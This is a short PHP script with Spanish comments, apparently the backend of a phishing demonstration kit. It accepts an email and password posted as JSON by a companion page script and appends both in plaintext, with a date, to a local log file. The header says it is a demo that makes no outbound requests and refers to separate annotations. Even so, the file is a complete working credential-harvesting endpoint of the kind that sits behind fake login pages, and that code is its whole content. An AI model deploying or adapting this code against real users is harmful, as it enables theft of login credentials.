<?php
/*
 * capture.php — FUNCIONAL, recibe el POST en JSON que envía dynamic.js
 * por AJAX. Escribe SOLO en un log local — nunca hace ninguna petición
 * de red saliente. Ver annotations.md, sección 5.
 */

header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'] ?? null;
$pass = $data['pass'] ?? null;

if (!$email || !$pass) {
    echo json_encode(['saved' => false, 'error' => 'faltan campos']);
    exit;
}

$line = "Email: $email\nClave: $pass\nFecha: " . date('c') . "\n\n";
file_put_contents(__DIR__ . '/__DEMO_LOG__.txt', $line, FILE_APPEND);

echo json_encode(['saved' => true]);
